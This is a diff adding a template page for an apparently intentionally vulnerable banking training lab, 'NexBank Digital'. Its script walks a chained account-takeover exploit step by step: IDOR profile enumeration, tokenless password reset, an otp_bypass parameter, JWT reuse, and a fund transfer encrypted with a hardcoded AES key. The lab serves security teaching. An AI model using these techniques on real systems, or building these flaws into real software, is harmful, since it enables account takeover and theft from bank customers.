@@ -1,0 +1,293 @@
+{% extends "base.html" %}
+{% block title %}Lab 1 — Account Takeover — NexBank Digital{% endblock %}
+{% block content %}
+<div class="page-header">
+  <h2>Lab 1 <span class="accent">Account Takeover</span></h2>
+  <p class="page-sub">Full ATO chain: IDOR recon → password reset bypass → OTP bypass → fund drain</p>
+</div>
+
+<div class="ato-objective">
+  <div class="obj-icon">🎯</div>
+  <div class="obj-text">
+    <strong>Objective:</strong> You are logged in as <em>Arjun Mehta</em> (mobile: 9100000001).
+    Completely take over <em>Priya Nair's</em> account, reset her password, log in as her, and transfer her ₹75,000 to Arjun's account — without ever knowing her password.
+  </div>
+</div>
+
+<div class="ato-steps">
+
+  <!-- Step 1: IDOR Recon -->
+  <div class="ato-step" id="step-1">
+    <div class="step-header">
+      <div class="step-num">01</div>
+      <div class="step-info">
+        <div class="step-title">IDOR Reconnaissance</div>
+        <div class="step-vuln">Vulnerability: IDOR on <code>GET /api/account/user/{user_id}/profile</code> — no ownership check</div>
+      </div>
+      <div class="step-status" id="s1-status">⬜</div>
+    </div>
+    <div class="step-body">
+      <p>Enumerate user IDs to find Priya's profile. The endpoint returns PAN, Aadhaar, email, and <code>password_hash</code> for <em>any</em> user ID — no authorization check exists.</p>
+      <div class="input-row">
+        <label class="form-label">Target User ID</label>
+        <input type="number" id="s1-user-id" class="form-input form-input-sm" value="2" min="1" max="10" placeholder="Try 1–5">
+        <button class="btn btn-danger" onclick="s1Recon()">Fetch Profile (IDOR)</button>
+      </div>
+      <pre id="s1-result" class="result-box"></pre>
+      <div id="s1-extracted" class="extracted-box" style="display:none">
+        <strong>Extracted:</strong>
+        User ID: <span id="s1-uid"></span> |
+        Mobile: <span id="s1-mobile"></span> |
+        Email: <span id="s1-email"></span> |
+        PAN: <span id="s1-pan"></span> |
+        MD5 hash: <span id="s1-hash" class="code-inline"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 2: Reset Password Without Token -->
+  <div class="ato-step" id="step-2">
+    <div class="step-header">
+      <div class="step-num">02</div>
+      <div class="step-info">
+        <div class="step-title">Reset Victim's Password — No Token Needed</div>
+        <div class="step-vuln">Vulnerability: Logic flaw in <code>POST /api/auth/reset-password</code> — accepts <code>user_id</code> directly, skips token validation</div>
+      </div>
+      <div class="step-status" id="s2-status">⬜</div>
+    </div>
+    <div class="step-body">
+      <p>The reset endpoint has two code paths: <code>if token</code> (validates token) and <code>elif user_id</code> (no validation at all — changes password immediately). No authentication required.</p>
+      <div class="input-row">
+        <input type="number" id="s2-user-id" class="form-input form-input-sm" placeholder="User ID from Step 1">
+        <input type="text"   id="s2-newpass" class="form-input form-input-sm" value="hacked123" placeholder="New password">
+        <button class="btn btn-danger" onclick="s2ResetPassword()">Reset Password</button>
+      </div>
+      <pre id="s2-result" class="result-box"></pre>
+    </div>
+  </div>
+
+  <!-- Step 3: OTP Bypass Login -->
+  <div class="ato-step" id="step-3">
+    <div class="step-header">
+      <div class="step-num">03</div>
+      <div class="step-info">
+        <div class="step-title">Login as Victim — OTP Bypass</div>
+        <div class="step-vuln">Vulnerability: <code>otp_bypass=true</code> parameter skips OTP validation entirely</div>
+      </div>
+      <div class="step-status" id="s3-status">⬜</div>
+    </div>
+    <div class="step-body">
+      <p>Use the victim's mobile number (from IDOR recon) with <code>otp_bypass: true</code> to skip OTP verification. Then complete the login to receive a JWT for the victim's account.</p>
+      <div class="input-row">
+        <input type="tel" id="s3-mobile" class="form-input form-input-sm" placeholder="Victim mobile from Step 1">
+        <button class="btn btn-danger" onclick="s3BypassLogin()">Bypass OTP &amp; Login</button>
+      </div>
+      <pre id="s3-result" class="result-box"></pre>
+      <div id="s3-token-box" class="extracted-box" style="display:none">
+        <strong>Victim JWT obtained:</strong><br>
+        <span id="s3-token" class="code-inline small-code"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 4: Access Victim's Accounts -->
+  <div class="ato-step" id="step-4">
+    <div class="step-header">
+      <div class="step-num">04</div>
+      <div class="step-info">
+        <div class="step-title">Access Victim's Bank Accounts</div>
+        <div class="step-vuln">Using the forged session — victim's JWT accepted server-side</div>
+      </div>
+      <div class="step-status" id="s4-status">⬜</div>
+    </div>
+    <div class="step-body">
+      <p>Use the victim's JWT to list her bank accounts and check balances.</p>
+      <button class="btn btn-danger" onclick="s4GetAccounts()">List Victim's Accounts</button>
+      <pre id="s4-result" class="result-box"></pre>
+      <div id="s4-acct-box" class="extracted-box" style="display:none">
+        Victim account number: <span id="s4-acct-num" class="code-inline"></span> |
+        Balance: ₹<span id="s4-balance"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 5: Drain Funds -->
+  <div class="ato-step" id="step-5">
+    <div class="step-header">
+      <div class="step-num">05</div>
+      <div class="step-info">
+        <div class="step-title">Drain Victim's Funds</div>
+        <div class="step-vuln">AES-encrypted transfer payload with key hardcoded in <code>/static/js/app.js</code></div>
+      </div>
+      <div class="step-status" id="s5-status">⬜</div>
+    </div>
+    <div class="step-body">
+      <p>Transfer all funds from Priya's account to Arjun's account using the victim's JWT. The transfer payload is AES-CBC encrypted — key <code>NexBankSecure2024</code> is visible in <code>/static/js/app.js</code>.</p>
+      <div class="input-row">
+        <input type="text"   id="s5-from"   class="form-input form-input-sm" placeholder="Victim account (from Step 4)">
+        <input type="text"   id="s5-to"     class="form-input form-input-sm" value="NXB1000000001" placeholder="Your account">
+        <input type="number" id="s5-amount" class="form-input form-input-sm" value="75000" placeholder="Amount">
+        <button class="btn btn-danger" onclick="s5Drain()">Transfer (Drain)</button>
+      </div>
+      <pre id="s5-result" class="result-box"></pre>
+    </div>
+  </div>
+
+</div>
+
+<!-- ATO Summary -->
+<div id="ato-complete" class="ato-complete-box" style="display:none">
+  <div class="complete-icon">✅</div>
+  <h3>Account Takeover Complete</h3>
+  <p>You exploited <strong>4 vulnerabilities</strong> in one chained attack:</p>
+  <ol>
+    <li><strong>IDOR</strong> — accessed victim's profile with no ownership check</li>
+    <li><strong>Broken Auth: Reset Logic Flaw</strong> — changed victim's password with only their user_id</li>
+    <li><strong>Broken Auth: OTP Bypass</strong> — skipped OTP with <code>otp_bypass=true</code></li>
+    <li><strong>Crypto Failure</strong> — used hardcoded AES key to craft transfer payload</li>
+  </ol>
+  <a href="/" class="btn btn-primary">Back to Labs</a>
+</div>
+
+{% endblock %}
+{% block scripts %}
+<script>
+var _victimToken  = null;
+var _victimUserId = null;
+var _victimMobile = null;
+var _steps        = { 1: false, 2: false, 3: false, 4: false, 5: false };
+
+document.addEventListener('DOMContentLoaded', function() {
+  if (!getToken()) {
+    document.querySelector('.ato-steps').insertAdjacentHTML('beforebegin',
+      '<div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:16px 20px;margin-bottom:20px;display:flex;align-items:center;gap:12px">' +
+      '<span style="font-size:24px">🔐</span>' +
+      '<div><strong style="color:#856404">Login required</strong><br>' +
+      '<span style="font-size:13px;color:#856404">You must be logged in as <strong>Arjun Mehta</strong> to start this lab. &nbsp;' +
+      '<a href="/login" style="color:#0044aa;font-weight:600">Login now →</a></span></div></div>'
+    );
+  }
+});
+
+function markStep(n, ok) {
+  _steps[n] = ok;
+  document.getElementById('s' + n + '-status').textContent = ok ? '✅' : '❌';
+  if (ok && n < 5) document.getElementById('step-' + (n+1)).scrollIntoView({ behavior: 'smooth', block: 'start' });
+  if (_steps[1] && _steps[2] && _steps[3] && _steps[4] && _steps[5])
+    document.getElementById('ato-complete').style.display = 'block';
+}
+
+/* Step 1 — IDOR recon */
+function s1Recon() {
+  var id = document.getElementById('s1-user-id').value;
+  fetch('/api/account/user/' + id + '/profile', { headers: authHeaders() })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      document.getElementById('s1-result').textContent = JSON.stringify(data, null, 2);
+      if (data.user) {
+        var u = data.user;
+        _victimUserId = u.id;
+        _victimMobile = u.mobile;
+        document.getElementById('s1-uid').textContent    = u.id;
+        document.getElementById('s1-mobile').textContent = u.mobile;
+        document.getElementById('s1-email').textContent  = u.email;
+        document.getElementById('s1-pan').textContent    = u.pan_number || '-';
+        document.getElementById('s1-hash').textContent   = u.password_hash || '-';
+        document.getElementById('s1-extracted').style.display = 'block';
+        document.getElementById('s2-user-id').value  = u.id;
+        document.getElementById('s3-mobile').value   = u.mobile;
+        markStep(1, true);
+      } else { markStep(1, false); }
+    });
+}
+
+/* Step 2 — reset password via user_id (no token) */
+function s2ResetPassword() {
+  var uid  = document.getElementById('s2-user-id').value;
+  var pass = document.getElementById('s2-newpass').value;
+  if (!uid || !pass) { showAlert('Fill user_id and new password', 'error'); return; }
+  fetch('/api/auth/reset-password', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ user_id: parseInt(uid), new_password: pass })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    document.getElementById('s2-result').textContent = JSON.stringify(data, null, 2);
+    markStep(2, !!data.message);
+  });
+}
+
+/* Step 3 — OTP bypass + login */
+function s3BypassLogin() {
+  var mob = document.getElementById('s3-mobile').value.trim() || _victimMobile;
+  if (!mob) { showAlert('Run Step 1 first to get victim mobile', 'error'); return; }
+
+  // bypass OTP first
+  fetch('/api/auth/verify-otp', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ mobile: mob, otp_bypass: true })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (!data.user_id) { document.getElementById('s3-result').textContent = JSON.stringify(data, null, 2); markStep(3, false); return; }
+    var uid = data.user_id;
+    // complete login
+    return fetch('/api/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ otp_verified: true, user_id: uid })
+    }).then(function(r) { return r.json(); }).then(function(loginData) {
+      document.getElementById('s3-result').textContent = JSON.stringify(loginData, null, 2);
+      if (loginData.token) {
+        _victimToken = loginData.token;
+        document.getElementById('s3-token').textContent = loginData.token;
+        document.getElementById('s3-token-box').style.display = 'block';
+        showAlert('Victim JWT obtained. Logged in as ' + (loginData.user && loginData.user.name), 'success');
+        markStep(3, true);
+      } else { markStep(3, false); }
+    });
+  });
+}
+
+/* Step 4 — list victim accounts */
+function s4GetAccounts() {
+  if (!_victimToken) { showAlert('Complete Step 3 first', 'error'); return; }
+  fetch('/api/account/my-accounts', { headers: { 'Authorization': 'Bearer ' + _victimToken, 'Content-Type': 'application/json' } })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      document.getElementById('s4-result').textContent = JSON.stringify(data, null, 2);
+      if (data.accounts && data.accounts.length) {
+        var a = data.accounts[0];
+        document.getElementById('s4-acct-num').textContent = a.account_number;
+        document.getElementById('s4-balance').textContent  = a.balance.toLocaleString('en-IN');
+        document.getElementById('s4-acct-box').style.display = 'block';
+        document.getElementById('s5-from').value = a.account_number;
+        document.getElementById('s5-amount').value = Math.floor(a.balance);
+        markStep(4, true);
+      } else { markStep(4, false); }
+    });
+}
+
+/* Step 5 — drain funds */
+function s5Drain() {
+  if (!_victimToken) { showAlert('Complete Step 3 first', 'error'); return; }
+  var from   = document.getElementById('s5-from').value.trim();
+  var to     = document.getElementById('s5-to').value.trim();
+  var amount = parseFloat(document.getElementById('s5-amount').value);
+  if (!from || !to || !amount) { showAlert('Fill all fields', 'error'); return; }
+
+  var payload    = JSON.stringify({ from_account: from, to_account: to, amount: amount, description: 'Account takeover — fund drain' });
+  var encPayload = aesEncrypt(payload);
+
+  fetch('/api/txn/transfer', {
+    method: 'POST',
+    headers: { 'Authorization': 'Bearer ' + _victimToken, 'Content-Type': 'application/json' },
+    body: JSON.stringify({ enc_payload: encPayload })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    document.getElementById('s5-result').textContent = JSON.stringify(data, null, 2);
+    if (data.txn_id) {
+      showAlert('Funds drained! Txn: ' + data.txn_id + ' | New victim balance: ₹' + data.new_balance, 'success');
+      markStep(5, true);
+    } else { showAlert(data.error || 'Transfer failed', 'error'); markStep(5, false); }
+  });
+}
+</script>
+{% endblock %}
